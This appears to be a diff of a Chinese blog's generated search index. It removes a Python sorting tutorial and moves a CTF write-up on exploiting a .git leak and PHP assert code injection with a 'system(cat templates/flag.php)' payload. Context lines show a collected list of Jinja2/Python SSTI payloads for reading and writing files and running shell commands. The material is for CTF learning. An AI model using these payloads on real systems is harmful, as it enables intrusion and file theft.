-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义一个取第二个元素的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">takesecond</span>(<span class="params">item</span>):</span></span><br><span class="line">    <span class="keyword">return</span> item[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#循环列表中的每一个元素，并且根据元素中的第二个元素进行排序。</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=takesecond)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义了一个匿名函数，参数x，返回x中的第二个元素</span></span><br><span class="line"><span class="comment">#key 指定了根据x的第二个元素进行排序</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>
-
-<p>key会把列表的元素作为参数传入后面的函数，然后把函数的返回值作为排序的依据。</p>
-<h4 id="2-2-1扩展"><a href="#2-2-1扩展" class="headerlink" title="2.2.1扩展"></a>2.2.1扩展</h4><p>如果key接受了两个返回值，那么第一个返回值就会是首要排序依据，如果第一个返回值相等，那么会根据第二个返回值进行排序。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>],[<span class="number">31</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义了一个匿名函数，返回第一个元素和第二个元素</span></span><br><span class="line"><span class="comment">#key就会让x[1]成为首要排序依据，另一个成为次要依据</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [31, 2], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="2-3reverse参数的应用"><a href="#2-3reverse参数的应用" class="headerlink" title="2.3reverse参数的应用"></a>2.3reverse参数的应用</h3><p><strong>reverse = True</strong> 降序， <strong>reverse = False</strong> 升序（默认）。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>],[<span class="number">31</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#设置为降序，从大到小。</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]),reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[1, 3], [32, 2], [31, 2], [12, 1]]</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="3-sorted"><a href="#3-sorted" class="headerlink" title="3.sorted"></a>3.sorted</h2><h3 id="3-1参数"><a href="#3-1参数" class="headerlink" title="3.1参数"></a>3.1参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sorted</span>(iterable, cmp=<span class="literal">None</span>, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>iterable – 可迭代对象。</li>
-<li>cmp – 比较的函数，这个具有两个参数，参数的值都是从可迭代对象中取出，此函数必须遵守的规则为，大于则返回1，小于则返回-1，等于则返回0。</li>
-<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
-<li>reverse – 排序规则，reverse = True 降序 ， reverse = False 升序（默认）。</li>
-</ul>
-<h3 id="3-2对key参数的应用"><a href="#3-2对key参数的应用" class="headerlink" title="3.2对key参数的应用"></a>3.2对key参数的应用</h3><p>按value值对字典排序</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">3</span>,<span class="string">&quot;b&quot;</span>:<span class="number">1</span>,<span class="string">&quot;c&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="comment">#指定迭代对象是字典中的每一个键值对</span></span><br><span class="line"><span class="comment">#将键值对作为参数传入匿名函数，返回值，将value作为排序的标准</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(d.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>]))</span><br><span class="line"><span class="comment">#[(&#x27;b&#x27;, 1), (&#x27;c&#x27;, 2), (&#x27;a&#x27;, 3)]</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-3对cmp参数的使用（效率key-gt-cmp）"><a href="#3-3对cmp参数的使用（效率key-gt-cmp）" class="headerlink" title="3.3对cmp参数的使用（效率key&gt;cmp）"></a>3.3对cmp参数的使用（效率key&gt;cmp）</h3><p>发现在py3中取消了cmp参数，那就不写啦！</p>
-<h3 id="3-4reverse"><a href="#3-4reverse" class="headerlink" title="3.4reverse"></a>3.4reverse</h3><p>和上面的一样的</p>
-<h2 id="4-应用扩展"><a href="#4-应用扩展" class="headerlink" title="4.应用扩展"></a>4.应用扩展</h2><p>输入名字（英文），名字在前面形式在后面中间用空格分离，要求根据姓氏排序，姓氏首字母一样就用名字排序，然后输出一个列表，每一个元素装一个名字。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sName=<span class="built_in">input</span>(<span class="string">&quot;输入名字，名前后姓，quit退出&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;quit&quot;</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">while</span> sName!=<span class="string">&quot;quit&quot;</span>:</span><br><span class="line">    a.append(sName)</span><br><span class="line">    sName=<span class="built_in">input</span>() <span class="keyword">or</span> <span class="string">&quot;quit&quot;</span></span><br><span class="line"><span class="comment"># 把名字和姓氏组成一个列表嵌套进一个列表中</span></span><br><span class="line">Allname=[x.split() <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line"><span class="comment">#排序</span></span><br><span class="line">Allname.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]))</span><br><span class="line">final=[]</span><br><span class="line"><span class="comment">#把嵌套的列表转换回来</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Allname)):</span><br><span class="line">    final.append(<span class="string">&quot; &quot;</span>.join(y <span class="keyword">for</span> y <span class="keyword">in</span> Allname[x]))</span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>-python</category>
@@ -2465,6 +2527,46 @@
       </categories>
   </entry>
   <entry>
+    <title>攻防世界 mfw git泄露</title>
+    <url>/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/</url>
+    <content><![CDATA[<h1 id="攻防世界-mfw-git泄露"><a href="#攻防世界-mfw-git泄露" class="headerlink" title="攻防世界 mfw git泄露"></a>攻防世界 mfw git泄露</h1><p>由于昨天才学了git，找一道题来练练手</p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102092755185.png" alt="image-20220102092755185"></p>
+<p>点进去在about页面发现git关键词，访问.git目录</p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102092836849.png" alt="image-20220102092836849"></p>
+<p>存在泄露</p>
+<p>用githack把源码下载下来</p>
+<p>下载下来后发现一个flag.php</p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093430458.png" alt="image-20220102093430458"></p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093531927.png" alt="image-20220102093531927"></p>
+<p>再看看其他的php</p>
+<p>在index.php中有这样一段php</p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093735231.png" alt="image-20220102093735231"></p>
+<p>asserter()函数可以吧字符串当成php执行，这page又没有过滤，然后就想到用system来读取flag</p>
+<p>先试一下吧strpos给注释掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=%27).phpinfo();//</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102100454145.png" alt="image-20220102100454145"></p>
+<p>芜湖！</p>
+<p>最后用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=&#x27;).system(cat templates/flag.php);//</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102100753784.png" alt="image-20220102100753784"></p>
+<p>要打开源码才看得见</p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102102441825.png" alt="image-20220102102441825"></p>
+<p>然后又看到了另一种方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?page=abc&#x27;) or system(&quot;cat templates/flag.php&quot;);//</span><br></pre></td></tr></table></figure>
+
+<p>$file =templates/ abc’) or system(“cat templates/flag.php”);// “.php”<br> 因为在strpos中只传入了abc，所以其肯定返回false，在利用or让其执行system函数，再用” // “将后面的语句注释掉</p>
+<p><a href="https://www.cnblogs.com/xhds/p/12255609.html">PHP代码执行漏洞 - 笑花大王 - 博客园 (cnblogs.com)</a></p>
+<p>其他泄露：<br>.svn源码泄露：当可以访问到/.svn/entries的时候，就证明存在。<br>DS_Store 文件泄露：当访问/.ds_store可以访问的到，就证明存在。<br>.hg 源码泄露：当访问/.hg存在的时候，就证明存在该漏洞。<br>常见编辑器备份文件泄露：<br>http://[ip]/.test.php.swp<br>http://[ip]/test.php.bak<br>http://[ip]/test.jsp.old<br>http://[ip]/cgi~<br>http://[ip]/index.php~</p>
+<p>or用法补充</p>
+<p>经常看到这样的语句：<br>file=fopen(file=fopen(filename, ‘r’) or die(“抱歉，无法打开: filename”);or在这里是这样理解的，因为在PHP中并不区分数据类型，所以filename”);or在这里是这样理解的，因为在PHP中并不区分数据类型，所以file既可以是int也可以bool，所以这样的语句不会报错。但其处理过程可能有些朋友不大明白。<br>其实在大多数的语言中， bool or bool这样的语句中，如果前一个值为真后一个值就不会再判断了。这里也是的，所以如果fopen函数执行正确的话，会返回一个大于0的int值（这其实就是“真”），后面的语句就不会执行了。如果fopen函数执行失败，就会返回false，那么就会判断后面的表达式是否为真了。<br>结果执行了die()之后，不管返回什么，程序都已经停止执行了，并且显示指定的出错信息，也就达到了调试的目的。<br>就这样。</p>
+]]></content>
+      <categories>
+        <category>-Experience</category>
+      </categories>
+  </entry>
+  <entry>
     <title>攻防世界 Confusion1 ssti漏洞系统讲解</title>
     <url>/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/</url>
     <content><![CDATA[<h1 id="攻防世界-Confusion1"><a href="#攻防世界-Confusion1" class="headerlink" title="攻防世界 Confusion1"></a>攻防世界 Confusion1</h1><p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103171818134.png" alt="image-20220103171818134">打开题目是这样</p>
@@ -2513,46 +2615,6 @@
 <p>常见payload收集</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//获取基本类</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line"></span><br><span class="line">//读文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">//写文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line">//执行任意命令</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line">% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;_IterationGuard&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>-Experience</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>攻防世界 mfw git泄露</title>
-    <url>/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/</url>
-    <content><![CDATA[<h1 id="攻防世界-mfw-git泄露"><a href="#攻防世界-mfw-git泄露" class="headerlink" title="攻防世界 mfw git泄露"></a>攻防世界 mfw git泄露</h1><p>由于昨天才学了git，找一道题来练练手</p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102092755185.png" alt="image-20220102092755185"></p>
-<p>点进去在about页面发现git关键词，访问.git目录</p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102092836849.png" alt="image-20220102092836849"></p>
-<p>存在泄露</p>
-<p>用githack把源码下载下来</p>
-<p>下载下来后发现一个flag.php</p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093430458.png" alt="image-20220102093430458"></p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093531927.png" alt="image-20220102093531927"></p>
-<p>再看看其他的php</p>
-<p>在index.php中有这样一段php</p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093735231.png" alt="image-20220102093735231"></p>
-<p>asserter()函数可以吧字符串当成php执行，这page又没有过滤，然后就想到用system来读取flag</p>
-<p>先试一下吧strpos给注释掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=%27).phpinfo();//</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102100454145.png" alt="image-20220102100454145"></p>
-<p>芜湖！</p>
-<p>最后用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=&#x27;).system(cat templates/flag.php);//</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102100753784.png" alt="image-20220102100753784"></p>
-<p>要打开源码才看得见</p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102102441825.png" alt="image-20220102102441825"></p>
-<p>然后又看到了另一种方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?page=abc&#x27;) or system(&quot;cat templates/flag.php&quot;);//</span><br></pre></td></tr></table></figure>
-
-<p>$file =templates/ abc’) or system(“cat templates/flag.php”);// “.php”<br> 因为在strpos中只传入了abc，所以其肯定返回false，在利用or让其执行system函数，再用” // “将后面的语句注释掉</p>
-<p><a href="https://www.cnblogs.com/xhds/p/12255609.html">PHP代码执行漏洞 - 笑花大王 - 博客园 (cnblogs.com)</a></p>
-<p>其他泄露：<br>.svn源码泄露：当可以访问到/.svn/entries的时候，就证明存在。<br>DS_Store 文件泄露：当访问/.ds_store可以访问的到，就证明存在。<br>.hg 源码泄露：当访问/.hg存在的时候，就证明存在该漏洞。<br>常见编辑器备份文件泄露：<br>http://[ip]/.test.php.swp<br>http://[ip]/test.php.bak<br>http://[ip]/test.jsp.old<br>http://[ip]/cgi~<br>http://[ip]/index.php~</p>
-<p>or用法补充</p>
-<p>经常看到这样的语句：<br>file=fopen(file=fopen(filename, ‘r’) or die(“抱歉，无法打开: filename”);or在这里是这样理解的，因为在PHP中并不区分数据类型，所以filename”);or在这里是这样理解的，因为在PHP中并不区分数据类型，所以file既可以是int也可以bool，所以这样的语句不会报错。但其处理过程可能有些朋友不大明白。<br>其实在大多数的语言中， bool or bool这样的语句中，如果前一个值为真后一个值就不会再判断了。这里也是的，所以如果fopen函数执行正确的话，会返回一个大于0的int值（这其实就是“真”），后面的语句就不会执行了。如果fopen函数执行失败，就会返回false，那么就会判断后面的表达式是否为真了。<br>结果执行了die()之后，不管返回什么，程序都已经停止执行了，并且显示指定的出错信息，也就达到了调试的目的。<br>就这样。</p>
 ]]></content>
       <categories>
         <category>-Experience</category>
